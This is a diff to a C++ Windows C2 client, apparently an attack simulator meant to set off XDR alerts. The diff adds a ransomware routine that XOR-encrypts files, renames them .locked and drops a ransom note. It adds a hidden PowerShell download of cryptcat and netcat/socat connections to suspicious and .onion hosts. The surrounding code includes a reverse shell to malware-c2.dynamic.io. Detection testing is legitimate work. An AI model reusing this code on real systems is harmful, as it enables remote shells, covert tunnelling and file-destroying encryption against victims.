@@ -22,6 +22,9 @@
 #include <random>
 #include <map>
 #include <utility>
+#include <algorithm>
+#include <iterator>
+#include <Lmcons.h>
 
 #pragma comment(lib, "ws2_32.lib")
 #pragma comment(lib, "psapi.lib")
@@ -39,6 +42,94 @@ extern void logActivity(const std::string& category, const std::string& type, co
 #define CLIENT_BEACON_INTERVAL 10
 #define CLIENT_RETRY_DELAY 10000
 #define CLIENT_BUFFER_SIZE 4096
+
+std::string getFileHash(const std::string& path, const std::string& algorithm) {
+    std::string command = "powershell -Command \"(Get-FileHash -Algorithm " + algorithm +
+                         " '" + path + "').Hash\"";
+    FILE* pipe = _popen(command.c_str(), "r");
+    if (!pipe) return "UNKNOWN";
+    char buffer[128];
+    std::string result;
+    while (fgets(buffer, sizeof(buffer), pipe)) {
+        result += buffer;
+    }
+    _pclose(pipe);
+    result.erase(std::remove_if(result.begin(), result.end(), [](unsigned char c){ return c=='\r' || c=='\n'; }), result.end());
+    return result.empty() ? "UNKNOWN" : result;
+}
+
+std::pair<std::string, std::string> getFileSignatureInfo(const std::string& path) {
+    std::string command = "powershell -Command \"$s=Get-AuthenticodeSignature -FilePath '" +
+                         path + "'; Write-Output $s.Status; Write-Output $s.SignerCertificate.Subject\"";
+    FILE* pipe = _popen(command.c_str(), "r");
+    if (!pipe) return {"UNKNOWN", "UNKNOWN"};
+    char buffer[512];
+    std::vector<std::string> lines;
+    while (fgets(buffer, sizeof(buffer), pipe)) {
+        std::string line(buffer);
+        line.erase(std::remove(line.begin(), line.end(), '\r'), line.end());
+        line.erase(std::remove(line.begin(), line.end(), '\n'), line.end());
+        lines.push_back(line);
+    }
+    _pclose(pipe);
+    std::string status = lines.size() > 0 ? lines[0] : "UNKNOWN";
+    std::string signer = lines.size() > 1 ? lines[1] : "UNKNOWN";
+    if (status.empty()) status = "UNKNOWN";
+    if (signer.empty()) signer = "UNKNOWN";
+    return {status, signer};
+}
+
+std::string buildProcessLog(const std::string& status,
+                            const std::string& procName,
+                            const std::string& path,
+                            const std::string& cmd,
+                            DWORD pid) {
+    std::string md5 = getFileHash(path, "MD5");
+    std::string sha256 = getFileHash(path, "SHA256");
+    auto sig = getFileSignatureInfo(path);
+
+    char userBuf[UNLEN + 1];
+    DWORD userSize = UNLEN + 1;
+    GetUserNameA(userBuf, &userSize);
+
+    char cgoPath[MAX_PATH];
+    GetModuleFileNameA(NULL, cgoPath, MAX_PATH);
+    std::string cgoName = cgoPath;
+    size_t pos = cgoName.find_last_of("\\/");
+    if (pos != std::string::npos) cgoName = cgoName.substr(pos + 1);
+    std::string cgoCmd = GetCommandLineA();
+    std::string cgoMD5 = getFileHash(cgoPath, "MD5");
+    std::string cgoSHA256 = getFileHash(cgoPath, "SHA256");
+    auto cgoSig = getFileSignatureInfo(cgoPath);
+    DWORD cgoPid = GetCurrentProcessId();
+
+    std::ostringstream oss;
+    oss << "status=" << status
+        << " proc=" << procName
+        << " path=" << path
+        << " cmd=\\\"" << cmd << "\\\""
+        << " md5=" << md5
+        << " sha256=" << sha256
+        << " user=" << userBuf
+        << " signature=" << sig.first
+        << " signer=" << sig.second
+        << " pid=" << pid
+        << " cgo_name=" << cgoName
+        << " cgo_path=" << cgoPath
+        << " cgo_cmd=\\\"" << cgoCmd << "\\\""
+        << " cgo_md5=" << cgoMD5
+        << " cgo_sha256=" << cgoSHA256
+        << " cgo_signature=" << cgoSig.first
+        << " cgo_signer=" << cgoSig.second
+        << " cgo_pid=" << cgoPid
+        << " cgo_type=agent"
+        << " os_name=" << procName
+        << " os_path=" << path
+        << " os_cmd=\\\"" << cmd << "\\\""
+        << " os_signature=" << sig.first
+        << " os_pid=" << pid;
+    return oss.str();
+}
 
 // C2 Packet structure (must match server)
 #pragma pack(push, 1)
@@ -2073,7 +2164,86 @@ public:
         
         sendResponse("SSH:REVERSE:ESTABLISHED:PERSISTENCE_ENABLED");
     }
-    
+
+    void executeRansomware() {
+        sendResponse("RANSOMWARE:STARTING");
+
+        std::string baseDir = "C:\\temp\\ranom";
+        CreateDirectoryA("C:\\temp", NULL);
+        CreateDirectoryA(baseDir.c_str(), NULL);
+
+        // Count existing files in directory
+        WIN32_FIND_DATAA fdata;
+        HANDLE hFind = FindFirstFileA((baseDir + "\\*").c_str(), &fdata);
+        int count = 0;
+        if (hFind != INVALID_HANDLE_VALUE) {
+            do {
+                if (!(fdata.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) count++;
+            } while (FindNextFileA(hFind, &fdata));
+            FindClose(hFind);
+        }
+
+        // Create sample files if fewer than 50 exist
+        if (count < 50) {
+            std::vector<std::string> exts = {"txt","doc","xls","ppt","pdf","jpg","png","csv","html","xml"};
+            for (int i = count; i < 50; ++i) {
+                std::string path = baseDir + "\\sample_" + std::to_string(i) + "." + exts[i % exts.size()];
+                std::ofstream f(path, std::ios::binary);
+                if (f.is_open()) {
+                    f << "Sample data " << i;
+                    f.close();
+                }
+            }
+        }
+
+        const std::string key = "PANRansomKey";
+        hFind = FindFirstFileA((baseDir + "\\*").c_str(), &fdata);
+        if (hFind == INVALID_HANDLE_VALUE) {
+            sendResponse("RANSOMWARE:NO_FILES");
+            return;
+        }
+
+        do {
+            if (!(fdata.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
+                std::string filePath = baseDir + "\\" + fdata.cFileName;
+
+                std::ifstream in(filePath, std::ios::binary);
+                std::vector<char> data((std::istreambuf_iterator<char>(in)), std::istreambuf_iterator<char>());
+                in.close();
+
+                for (size_t i = 0; i < data.size(); ++i)
+                    data[i] ^= key[i % key.size()];
+
+                std::ofstream out(filePath, std::ios::binary | std::ios::trunc);
+                out.write(data.data(), data.size());
+                out.close();
+
+                std::string newPath = filePath + ".locked";
+                MoveFileA(filePath.c_str(), newPath.c_str());
+
+                std::string md5 = getFileHash(newPath, "MD5");
+                std::string sha256 = getFileHash(newPath, "SHA256");
+                std::string logMsg = "file=" + std::string(fdata.cFileName) +
+                    " path=" + newPath + " md5=" + md5 + " sha256=" + sha256 +
+                    " user=" + username + " pid=" + std::to_string(GetCurrentProcessId());
+                logActivity("*** XDR_ALERT ***", "RANSOMWARE_FILE_ENCRYPTED", logMsg);
+            }
+        } while (FindNextFileA(hFind, &fdata));
+        FindClose(hFind);
+
+        // Drop ransom note
+        std::string notePath = baseDir + "\\README_RESTORE_FILES.txt";
+        std::ofstream note(notePath);
+        if (note.is_open()) {
+            note << "All your files have been encrypted.\n";
+            note << "Send 5 BTC to 1FakeBitcoinAddress to restore them.";
+            note.close();
+        }
+        logActivity("*** XDR_ALERT ***", "RANSOMWARE_NOTE_DROPPED", "Note placed at " + notePath);
+
+        sendResponse("RANSOMWARE:COMPLETE");
+    }
+
     void executeNetcatTunnel() {
         sendResponse("NETCAT:STARTING");
         
@@ -2104,45 +2274,79 @@ public:
                            "Netcat tool downloaded to C:\\Windows\\Temp\\nc.exe");
             }
         }
-        
+
+        // Ensure netcat exists before attempting connections
+        if (GetFileAttributesA(ncPath.c_str()) == INVALID_FILE_ATTRIBUTES) {
+            sendResponse("NETCAT:NOT_FOUND");
+            logActivity("*** XDR_ALERT ***", "NETCAT_NOT_FOUND",
+                       "nc.exe missing - skipping execution");
+            return;
+        }
+
         // Real netcat connections
         std::vector<std::string> targets = {
             "portquiz.net:4444",              // Test server for outbound connections
             "45.142.114.231:80",              // Suspicious IP
             "malware-c2.dynamic.io:443",      // Suspicious domain
             "192.168.1.1:445",                // Internal SMB scan
-            "10.0.0.1:3389"                   // Internal RDP scan
+            "10.0.0.1:3389",                  // Internal RDP scan
+            "3g2upl4pq3kufc4m.onion:80",      // TOR hidden service
+            "fakec2trigger.onion:9999"        // Fake TOR domain to trigger alert
         };
-        
+
         for (const auto& target : targets) {
-            // Create real netcat process
-            std::string ncCmd = "C:\\Windows\\Temp\\nc.exe -v -n -z -w 2 " + 
-                              target.substr(0, target.find(':')) + " " + 
+            std::string ncCmd = "C:\\Windows\\Temp\\nc.exe -v -n -z -w 2 " +
+                              target.substr(0, target.find(':')) + " " +
                               target.substr(target.find(':') + 1);
-            
+
             STARTUPINFOA si = {0};
             PROCESS_INFORMATION pi = {0};
             si.cb = sizeof(si);
             si.dwFlags = STARTF_USESHOWWINDOW;
             si.wShowWindow = SW_HIDE;
-            
+
             if (CreateProcessA(NULL, (LPSTR)ncCmd.c_str(), NULL, NULL, FALSE,
                              CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
                 sendResponse("NETCAT:PROCESS:" + target + ":PID=" + std::to_string(pi.dwProcessId));
-                logActivity("*** XDR_ALERT ***", "NETCAT_SCAN", 
-                           "Netcat scanning " + target + " (PID: " + std::to_string(pi.dwProcessId) + ")");
-                
-                // Let it run briefly
-                WaitForSingleObject(pi.hProcess, 2000);
+
+                DWORD waitResult = WaitForSingleObject(pi.hProcess, 2000);
+                std::string status = "outgoing";
+                if (waitResult == WAIT_TIMEOUT) {
+                    status = "failed";
+                } else {
+                    DWORD exitCode = 0;
+                    GetExitCodeProcess(pi.hProcess, &exitCode);
+                    if (exitCode != 0) status = "failed";
+                }
+
+                std::string logMsg = buildProcessLog(status, "nc.exe", ncPath, ncCmd, pi.dwProcessId);
+
+                if (target.find(".onion") != std::string::npos) {
+                    logActivity("*** XDR_ALERT ***", "NETCAT_TOR_CONNECTION", logMsg);
+                } else {
+                    logActivity("*** XDR_ALERT ***", "NETCAT_SCAN", logMsg);
+                }
+
                 TerminateProcess(pi.hProcess, 0);
                 CloseHandle(pi.hProcess);
                 CloseHandle(pi.hThread);
+            } else {
+                logActivity("*** XDR_ALERT ***", "NETCAT_EXEC_FAILED",
+                           "Failed to execute nc.exe for target " + target);
             }
-            
+
             std::this_thread::sleep_for(std::chrono::milliseconds(300));
         }
-        
+
         // Create reverse shell process
+        // Double-check nc.exe still exists before attempting reverse shell
+        if (GetFileAttributesA(ncPath.c_str()) == INVALID_FILE_ATTRIBUTES) {
+            sendResponse("NETCAT:NOT_FOUND");
+            logActivity("*** XDR_ALERT ***", "NETCAT_NOT_FOUND",
+                       "nc.exe missing before reverse shell - skipping");
+            return;
+        }
+
         std::string reverseCmd = "C:\\Windows\\Temp\\nc.exe -e cmd.exe malware-c2.dynamic.io 4444";
         STARTUPINFOA si = {0};
         PROCESS_INFORMATION pi = {0};
@@ -2197,39 +2401,54 @@ public:
                            "Socat tool downloaded to C:\\Windows\\Temp\\socat.exe");
             }
         }
-        
+
+        // Ensure socat exists before attempting relays
+        if (GetFileAttributesA(socatPath.c_str()) == INVALID_FILE_ATTRIBUTES) {
+            sendResponse("SOCAT:NOT_FOUND");
+            logActivity("*** XDR_ALERT ***", "SOCAT_NOT_FOUND",
+                       "socat.exe missing - skipping execution");
+            return;
+        }
+
         // Create real socat relay processes
         std::vector<std::pair<std::string, std::string>> relays = {
             {"TCP4-LISTEN:8888,fork", "TCP4:torproject.org:9050"},
+            {"TCP4-LISTEN:9999,fork", "TCP4:3g2upl4pq3kufc4m.onion:80"},
             {"TCP4-LISTEN:7777,fork", "TCP4:malware-c2.dynamic.io:443"},
             {"TCP4-LISTEN:6666,fork", "TCP4:45.142.114.231:80"},
-            {"TCP4-LISTEN:5555,fork", "SOCKS4:127.0.0.1:192.168.1.1:445,socksport=9050"}
+            {"TCP4-LISTEN:5555,fork", "SOCKS4:127.0.0.1:192.168.1.1:445,socksport=9050"},
+            {"TCP4-LISTEN:4444,fork", "TCP4:fakec2trigger.onion:9999"} // Fake TOR domain to trigger alert
         };
-        
+
         for (const auto& relay : relays) {
-            // Create real socat process
             std::string socatCmd = "C:\\Windows\\Temp\\socat.exe " + relay.first + " " + relay.second;
-            
+
             STARTUPINFOA si = {0};
             PROCESS_INFORMATION pi = {0};
             si.cb = sizeof(si);
             si.dwFlags = STARTF_USESHOWWINDOW;
             si.wShowWindow = SW_HIDE;
-            
+
             if (CreateProcessA(NULL, (LPSTR)socatCmd.c_str(), NULL, NULL, FALSE,
                              CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
                 sendResponse("SOCAT:RELAY:PROCESS:" + relay.first + ":PID=" + std::to_string(pi.dwProcessId));
-                logActivity("*** XDR_ALERT ***", "SOCAT_RELAY_CREATED", 
-                           "Socat relay process: " + relay.first + " -> " + relay.second + 
+
+                std::string logMsg = buildProcessLog("outgoing", "socat.exe", socatPath, socatCmd, pi.dwProcessId);
+
+                if (relay.second.find(".onion") != std::string::npos || relay.first.find(".onion") != std::string::npos) {
+                    logActivity("*** XDR_ALERT ***", "SOCAT_TOR_CONNECTION", logMsg);
+                }
+
+                logActivity("*** XDR_ALERT ***", "SOCAT_RELAY_CREATED",
+                           "Socat relay process: " + relay.first + " -> " + relay.second +
                            " (PID: " + std::to_string(pi.dwProcessId) + ")");
-                
-                // Let it run for a bit then terminate
+
                 std::this_thread::sleep_for(std::chrono::milliseconds(3000));
                 TerminateProcess(pi.hProcess, 0);
                 CloseHandle(pi.hProcess);
                 CloseHandle(pi.hThread);
             }
-            
+
             std::this_thread::sleep_for(std::chrono::milliseconds(300));
         }
         
@@ -2267,6 +2486,98 @@ public:
         }
         
         sendResponse("SOCAT:COMPLETE");
+    }
+
+    void executeCryptcatTunnel() {
+        sendResponse("CRYPTCAT:STARTING");
+
+        // Download real cryptcat if it doesn't exist
+        std::string ccPath = "C:\\Windows\\Temp\\cryptcat.exe";
+        if (GetFileAttributesA(ccPath.c_str()) == INVALID_FILE_ATTRIBUTES) {
+            sendResponse("CRYPTCAT:DOWNLOADING");
+
+            // Download cryptcat using PowerShell
+            std::string downloadCmd = "powershell -WindowStyle Hidden -Command \"" +
+                std::string("$url='https://github.com/stasinopoulos/cryptcat/releases/download/1.2.1/cryptcat-1.2.1-win32.zip'; ") +
+                "$out='C:\\Windows\\Temp\\cryptcat.zip'; " +
+                "Invoke-WebRequest -Uri $url -OutFile $out -UseBasicParsing; " +
+                "Expand-Archive -Path $out -DestinationPath 'C:\\Windows\\Temp\\cryptcat_temp' -Force; " +
+                "Move-Item -Path 'C:\\Windows\\Temp\\cryptcat_temp\\cryptcat.exe' -Destination 'C:\\Windows\\Temp\\cryptcat.exe' -Force\"";
+
+            STARTUPINFOA si = {0};
+            PROCESS_INFORMATION pi = {0};
+            si.cb = sizeof(si);
+            si.dwFlags = STARTF_USESHOWWINDOW;
+            si.wShowWindow = SW_HIDE;
+
+            if (CreateProcessA(NULL, (LPSTR)downloadCmd.c_str(), NULL, NULL, FALSE,
+                             CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+                WaitForSingleObject(pi.hProcess, 30000);
+                CloseHandle(pi.hProcess);
+                CloseHandle(pi.hThread);
+                logActivity("*** XDR_ALERT ***", "CRYPTCAT_DOWNLOADED",
+                           "Cryptcat tool downloaded to C:\\Windows\\Temp\\cryptcat.exe");
+            }
+        }
+
+        // Ensure cryptcat exists before attempting connections
+        if (GetFileAttributesA(ccPath.c_str()) == INVALID_FILE_ATTRIBUTES) {
+            sendResponse("CRYPTCAT:NOT_FOUND");
+            logActivity("*** XDR_ALERT ***", "CRYPTCAT_NOT_FOUND",
+                       "cryptcat.exe missing - skipping execution");
+            return;
+        }
+
+        // Real cryptcat connections
+        std::vector<std::string> targets = {
+            "portquiz.net:4444",
+            "45.142.114.231:80",
+            "malware-c2.dynamic.io:443",
+            "192.168.1.1:445",
+            "10.0.0.1:3389",
+            "3g2upl4pq3kufc4m.onion:80",
+            "fakec2trigger.onion:9999"
+        };
+
+        for (const auto& target : targets) {
+            std::string ccCmd = "C:\\Windows\\Temp\\cryptcat.exe -v -n -z -w 2 " +
+                              target.substr(0, target.find(':')) + " " +
+                              target.substr(target.find(':') + 1);
+
+            STARTUPINFOA si = {0};
+            PROCESS_INFORMATION pi = {0};
+            si.cb = sizeof(si);
+            si.dwFlags = STARTF_USESHOWWINDOW;
+            si.wShowWindow = SW_HIDE;
+
+            if (CreateProcessA(NULL, (LPSTR)ccCmd.c_str(), NULL, NULL, FALSE,
+                             CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+                DWORD waitResult = WaitForSingleObject(pi.hProcess, 2000);
+                std::string status = "outgoing";
+                if (waitResult == WAIT_TIMEOUT) {
+                    status = "failed";
+                } else {
+                    DWORD exitCode = 0;
+                    GetExitCodeProcess(pi.hProcess, &exitCode);
+                    if (exitCode != 0) status = "failed";
+                }
+                TerminateProcess(pi.hProcess, 0);
+                CloseHandle(pi.hProcess);
+                CloseHandle(pi.hThread);
+
+                std::string logMsg = buildProcessLog(status, "cryptcat.exe", ccPath, ccCmd, pi.dwProcessId);
+                logMsg += " target=" + target;
+
+                if (target.find(".onion") != std::string::npos) {
+                    logActivity("*** XDR_ALERT ***", "CRYPTCAT_TOR_CONNECTION", logMsg);
+                }
+                logActivity("*** XDR_ALERT ***", "CRYPTCAT_CONNECTION", logMsg);
+            }
+
+            std::this_thread::sleep_for(std::chrono::milliseconds(300));
+        }
+
+        sendResponse("CRYPTCAT:COMPLETE");
     }
     
     void executeRemoteDesktop() {
@@ -2605,19 +2916,23 @@ public:
             case CMD_TOR_API_CALL:
                 executeTorApiCall();
                 break;
-                
+
             case CMD_REVERSE_SSH:
                 executeReverseSSH();
                 break;
-                
+
             case CMD_NETCAT_TUNNEL:
                 executeNetcatTunnel();
                 break;
-                
+
             case CMD_SOCAT_RELAY:
                 executeSocatRelay();
                 break;
-                
+
+            case CMD_RANSOMWARE:
+                executeRansomware();
+                break;
+
             case CMD_REMOTE_DESKTOP:
                 executeRemoteDesktop();
                 break;
@@ -2702,6 +3017,9 @@ public:
         } else if (decrypted.find("SOCAT:RELAY:CREATE:") == 0 || decrypted.find("DOWNLOAD:") == 0 && decrypted.find("socat") != std::string::npos) {
             logActivity("CLIENT_DEBUG", "SOCAT_CMD", "Received socat command");
             executeSocatRelay();
+        } else if (decrypted.find("CRYPTCAT:TUNNEL:CREATE:") == 0 || decrypted.find("PROCESS:CREATE:") == 0 && decrypted.find("cryptcat.exe") != std::string::npos) {
+            logActivity("CLIENT_DEBUG", "CRYPTCAT_CMD", "Received cryptcat command");
+            executeCryptcatTunnel();
         } else if (decrypted.find("CAMPAIGN:") == 0) {
             std::string campaign = decrypted.substr(9);
             sendResponse("CAMPAIGN:ACK:" + campaign);
@@ -2743,6 +3061,11 @@ public:
             } else {
                 logActivity("CLIENT_DEBUG", "SCREEN_COMMAND", "Unrecognized screen command: " + decrypted);
             }
+        } else if (decrypted.find("SCREENSHOT") != std::string::npos ||
+                   decrypted.find("CAPTURE_SCREEN") != std::string::npos) {
+            logActivity("CLIENT_DEBUG", "SCREENSHOT_ALIAS",
+                        "Screenshot command alias: " + decrypted);
+            executeScreenshot();
         } else {
             logActivity("CLIENT_DEBUG", "COMMAND_UNRECOGNIZED", "Unrecognized command: " + decrypted);
         }
